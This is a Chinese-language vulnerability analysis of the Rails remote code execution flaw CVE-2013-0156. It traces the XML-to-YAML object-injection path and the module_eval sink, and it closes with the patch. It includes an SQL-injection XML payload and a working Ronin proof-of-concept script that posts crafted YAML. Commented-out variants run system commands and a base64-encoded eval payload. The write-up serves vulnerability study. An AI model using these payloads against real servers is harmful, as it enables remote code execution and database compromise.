# 分析下难得一见的ROR的RCE（CVE－2013－0156）

**0x00 背景**

关于该漏洞的详细说明，GaRY已经在[zone中的一文](http://zone.wooyun.org/content/2295)中说的很清楚，因此本文主要的作用是科普下ROR的知识，大牛们请止步.

简单的说，ROR是一款基于Ruby编程语言（钓鱼岛是中国的，Ruby是全世界的）的敏捷Web开发框架，具有开箱即用的优点，为广大码畜提供了一揽子的MVC解决方案，因此在像笔者这样的自明文艺的码畜中流行度尚可。

然而，天下没有免费的午餐，对安全来说尤为如此，提供的功能越多，可能出现问题的surface也就越大，终于在ROR诞生的第十个年头出现了第一个广为人知的RCE，也就是本文说的CVE-2013-0156。

**0x01 成因（01）**

为了将广大苦逼的码畜从解析http请求参数的无聊代码中解脱出来，进而以面向对象的范式来操纵用户提交的参数，很多Web开发框架都提供了参数的自动解析功能，以REST闻名进而喜欢在请求和响应中传递对象的ROR当然不会例外。简单的说，如果我们在浏览器中提交如下的表单：

```
<form action="/clozure/test1" method="POST">  
      <input type="text" name="wooyun[foo]" />  
      <input type="text" name="wooyun[bar][pie]" />  
      <input type="submit" />

</form> 

```

在我们的controller中，我们将经过ROR解析过的参数以yaml的格式dump出来：

```
def test1  
     render :text => params.to_yaml

end

```

会得到如下的显示：

```
---| !ruby/hash:ActiveSupport::HashWithIndifferentAccess  
wooyun: !ruby/hash:ActiveSupport::HashWithIndifferentAccess  
  foo: v1  
  bar: !ruby/hash:ActiveSupport::HashWithIndifferentAccess  
    pie: v2  
controller: test

action: test1

```

我们可以看到，ROR自动帮我们生成了一个hash，其中第二个key（bar）对应的value还是一个嵌套hash，这样我们就成功的向controller中注入了一个对象。

等等，这样就注入一个对象是不是太简单了，而且这能有啥用？CVE－2012-6496告诉我们，如果我们在代码中写了类似下文的代码，并且我们能完全控制提交的参数的值，就会出现SQL注入：

```
User.find_by_id(params["id"])

```

这样，只要我们能使参数中id对应的value是个hash，并且hash中有个叫:selection的key，我们就可以控制数据库了。可是，我们真的完全控制id对应的value了吗？明显没有，大家仔细看上面的YAML会发现，那个Hash是HashWithIndifferentAccess，它的所有key都是String，不能是像:selection这样的Symbol，所以CVE－2012-6496的利用情况比较苛刻，除非是像poc作者提到的那样的从cookie中传进去带有类型是Symbol的key的hash，一般情况下不会出现该注入漏洞。

**0x02 成因（02）**

就在我们一筹莫展的时候，CVE-2013-0156来了，它告诉我们原来ROR不止会帮我们解析类似上面那个HTML中提到的参数，还会帮我们解析其他格式的请求，如JSON、XML、YAML等。

JSON格式比较简单，只能有些数组、hash、字符串之类的良民对象，可YAML就不同了，YAML是可以指定TAG的，通过TAG，我们可以让ROR将参数解析成ROR中任意已经load进来的Class的对象，这个危害就大了。这也是为什么在较高版本的ROR里面，YAML的解析会被默认禁用掉的原因：

```
DEFAULT_PARSERS = {  
      Mime::XML => : xml_simple,  
      Mime::JSON => :json

}

```

看，没有YAML吧？（坏笑）

然而我们不要忘了XML，xml的解析是默认打开的，在解析xml的过程中，ROR使用了如下代码：

```
when : xml_simple, : xml_node  
          data = Hash.from_xml(request.raw_post) || {}

          data.with_indifferent_access

```

看到data.with_indifferent_access断了我们key的类型是Symbl的Hash对象的幻想的同时，我们继续跟进Hash.from_xml，会看到它进而调用了：

```
def typecast_xml_value(value)  
        case value.class.to_s  
          when 'Hash'  
            if value['type'] == 'array'  
              ....  
              ...  
            elsif .. ||  (value["**content**"] &&   
                 (value.keys.size == 1 ||value["**content**"].present?))  
              content = value["**content**"]  
              if parser = ActiveSupport::XmlMini::PARSING[value["type"]]  
                parser.arity == 1 ? parser.call(content) : parser.call(content, value)  
              else  
                content  
              end  
            .....  
            end  
          when 'Array'  
            value.map! { |i| typecast_xml_value(i) }  
            value.length > 1 ? value : value.first  
          when 'String'  
            value  
        end

      end

```

这段代码笔者刚看时也没看出有啥问题来，后来根据POC和Gary大牛的指导，才知道xml里的node可以制订type，而type只要在ActiveSupport::XmlMini::PARSING中，就会被解析！如果type被指定为YAML呢？答案是可以解析，这样，我们又回到了成因（1）结束的地方，只不过这次我们不是直接吧http请求的content－type指定为application/yaml，而是指定为application/xml，同时将其中一个node的type指定为yaml。

针对上面描述的SQL注入，虽然我们还是没法注入带Symbol类型key的Hash对象（万恶的withIndifferent），但是POC作者给出了使用SqlLiteral进行注入的思路，即我们需要提交一个如下的XML到有注入漏洞的controller

```
<?xml version="1.0" encoding="UTF-8"?>  
<id type="yaml">  
---| !ruby/string:Arel::Nodes::SqlLiteral  
"1 or 1=1"

</id>

```

此处，YAML的TAG比较复杂：“ruby/string:Arel::Nodes::SqlLiteral”，简单的说，此处是以string的方式解析“1 or 1=1”这个字符串，也就相当于调用了SqlLiteral.new("1 or 1=1"),这样就能进行广大黑阔们最爱的SQL注入了。

**0x03 进阶**

都能注入YAML对象了，还得去找个2B码畜的代码来进行SQL注入？postmodern大牛说这简直弱爆了，于是给出了一个RCE，因为参数解析发生在url路由之前，只要参数确实被解析了，就可以无视Controller的存在性，无视是GET还是POST，甚至无视代码是怎么写的。

简单的说，YAML有几种解析方式，如果以“---||||||||||| !ruby/string”为前缀，后面的字符串相当于传给了构造函数，如果以“---||||||||||| !ruby/object“为前缀，后面的Hash相当于设置对象的实例变量，如果以“---||||||||||| !ruby/hash”为前缀，则相当于在对象上调用obj[key]=val，限于篇幅，读者可以自己去看一下ROR中YAML的解析部分代码，此处略去。

奇葩的是，在ruby中，obj[key]=val这样的赋值操作是有一个专门的函数"[]="来完成的，postmodern找到了在ActionDispatch::Routing::RouteSet::NamedRouteCollection的"[ ]="方法里面有一个对key进行eval的代码路径：

```
alias []=   add  
...  
def add(name, route)  
    routes[name.to_sym] = route  
    define_named_route_methods(name, route)  
end

def define_named_route_methods(name, route)  
    {:url => {:only_path => false}, :path => {:only_path => true}}\  
          .each do |kind, opts|  
              #by clozure  
              #require 'logger'  
              #Logger.new("/tmp/rails.logger").info(route)  
              hash = route.defaults.merge(:use_route => name).merge(opts)  
              define_hash_access route, name, kind, hash  
              define_url_helper route, name, kind, hash  
          end  
end

def define_hash_access(route, name, kind, options)  
     selector = hash_access_name(name, kind)  
     #by clozure  
     #require 'logger'  
     #Logger.new("/tmp/rails.log").info(selector)  
     # We use module_eval to avoid leaks  
     @module.module_eval <<-END_EVAL, **FILE**, **LINE** + 1  
         remove_possible_method :#{selector}  
     ... ...  
end

def hash_access_name(name, kind = :url)

    :"hash_for_#{name}_#{kind}"

end

```

从上面的代码中，我们可以看到，NamedRouteCollection把"[ ] ="方法别名到了add方法，add方法进而调用了define_named_route_methods，最后在define_hash_access中我们看到了可爱的module_eval，在eval块里面，有个被替换的变量selector来自name，这样，我们只需要巧妙构造下name就可以执行任意ruby代码了！

我们在rails console中做个小试验：

```
[clozure@clozure-air:OOXX]$ rails c  
Loading development environment (Rails 3.2.11)  
1.9.3-p362 :001 >  
1.9.3-p362 :001 > test = ActionDispatch::Routing::RouteSet::NamedRouteCollection.new  
 => #<ActionDispatch::Routing::RouteSet::NamedRouteCollection:0x007fef2abcc7f0 @routes={}, @helpers=[], @module=#<Module:0x007fef2abcc6d8>>  
1.9.3-p362 :002 > test['clozure;sleep(10);clozure'] = {}  
NoMethodError: undefined method `defaults' for {}:Hash<br /><p><br />
     from /Users/clozure/.rvm/gems/ruby-1.9.3-p362/gems/actionpack-3.2.11/lib/action_dispatch/routing/route_set.rb:168:in`block in define_named_route_methods'

```

本想sleep(10)，结果不仅报错了，也没sleep成，看下报错信息，是在下面这行报错的：

```
hash = route.defaults.merge(:use_route => name).merge(opts)

```

这个我们貌似看到过吧？是的，就在define_hash_access调用的上面，还有这么一个拦路虎，它在我们的value上调用了defaults方法，我们的{}一无所有，怎么会有defaults方法呢？

这时候，我们需要OpenStruct对象出场了，出于ruby的meta programming需求，当我们OpenStruct.new("foo" => "bar")时，新创建的对象就自动有了一个foo方法，其返回值是bar，当然，你可以在bar的位置写个动态的lambda表达式，体验一把函数式编程，不过与我们的主题无关了。ok，继续试验：

```
1.9.3-p362 :003 > test = ActionDispatch::Routing::RouteSet::NamedRouteCollection.new  
 => #<ActionDispatch::Routing::RouteSet::NamedRouteCollection:0x007fef2ab551a0 @routes={}, @helpers=[], @module=#<Module:0x007fef2ab55038>>  
1.9.3-p362 :004 > test['clozure;sleep(10);clozure'] = OpenStruct.new("defaults" => {})

NameError: undefined local variable or method `clozure_url' for #<Module:0x007fef2ab55038>

```

这次程序睡足了10秒钟，然后抱怨找不到cojzure_url变量，已经做过了我们目标的eval语句，执行代码成功！

现在我们的问题变成了怎么把这个OpenStruct放到YAML里面，我们貌似没法在YAML里面给对象指定构造函数的非String的参数吧？看下OpenStruct的实现代码，我们发现它所有的“函数名=>返回值”对应关系是保存在@table实例变量里面的，这就轮到“---||||||||||| !ruby/object“前缀的YAML出场了，通过他我们可以设置实例变量，这样所有的拼图就完整了，我们得到了如下的嗜睡的poc：

```
xml = %{  
<?xml version="1.0" encoding="UTF-8"?>  
<bingo type='yaml'>  
---| !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection  
'test; sleep(10); test' :  
 !ruby/object:OpenStruct  
  table:  
   :defaults: {}  
</bingo>

}.strip

```

(后来大家发现---||||||||||| !ruby/struct可以达到与OpenStruct类似的功效，有兴趣的童鞋可以研究下)

测试代码如下：

```
require 'ronin/network/http'
require 'ronin/ui/output'
require 'yaml'

include Ronin::Network::HTTP
include Ronin::UI::Output::Helpers

url   = ARGV[0]

# xml = %{
# <?xml version="1.0" encoding="UTF-8"?>
# <bingo type='yaml'>
# --- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
# 'test; eval(%[Y29kZSA9ICdjM2x6ZEdWdEtDZGxZMmh2SUNJeE1URWlJRDRnTDNSdGNDOW1kV05yWm5WamF5Y3AnLnVucGFjaygibTAiKS5maXJzdAppZiBSVUJZX1BMQVRGT1JNID1+IC9tc3dpbnxtaW5nd3x3aW4zMi8KaW5wID0gSU8ucG9wZW4oInJ1YnkiLCAid2IiKSByZXNjdWUgbmlsCmlmIGlucAppbnAud3JpdGUoY29kZSkKaW5wLmNsb3NlCmVuZAplbHNlCmlmICEgUHJvY2Vzcy5mb3JrKCkKZXZhbChjb2RlKSByZXNjdWUgbmlsCmVuZAplbmQ=].unpack(%[m0])[0]);' :
#  !ruby/object:OpenStruct
#   table:
#    :defaults: {}
# </bingo>
# }.strip

# xml = %{
# <?xml version="1.0" encoding="UTF-8"?>
# <bingo type='yaml'>
# --- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
# 'test; system("touch /tmp/rails");' :
#  !ruby/object:OpenStruct
#   table:
#    :defaults: {}
# </bingo>
# }.strip

xml = %{
<?xml version="1.0" encoding="UTF-8"?>
<bingo type='yaml'>
--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
'test; sleep(10);' :
 !ruby/object:OpenStruct
  table:
   :defaults: {}
</bingo>
}.strip

response = http_post(
  :url       => url,
  :headers   => {
    :content_type           => 'text/xml',
    :\x_http_method_override => 'post'
  },
  :body      => xml
)

print_debug "Received #{response.code} response"

puts response.code
case response.code
when '200' then print_info  response.body + " ok"
when '404' then print_error "Not found"
when '500' then print response.body
end

```

**0x04 补丁**

在笔者下载到的最新版Rails中，已经做了如下处理：

```
def typecast_xml_value(value, disallowed_types = nil)  
    disallowed_types ||= DISALLOWED_XML_TYPES  
    case value.class.to_s  
    when 'Hash'  
        if value.include?('type') && !value['type'].is_a?(Hash) && dis\  
            allowed_types.include?(value['type'])  
            raise DisallowedType, value['type']  
        end  
... ...

DISALLOWED_XML_TYPES = %w(symbol yaml)

```

这样，xml里面node的type不能为yaml和symbol了，也就解决了这个问题

P.S. 初次些东西，前言不搭后语，大家见谅